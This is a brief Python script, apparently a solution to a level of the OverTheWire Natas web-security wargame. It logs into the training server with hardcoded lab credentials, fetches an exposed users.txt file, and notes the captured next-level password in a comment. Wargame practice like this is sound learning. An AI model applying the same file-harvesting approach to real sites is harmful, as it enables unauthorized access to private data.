import requests
import sys
username = "natas2"
password = "ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi"

response = requests.get("http://natas2.natas.labs.overthewire.org/files/users.txt", auth=(username, password))

sys.stdout = open("results.html", "w")
print(response.text)
sys.stdout.close()

#pass is sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14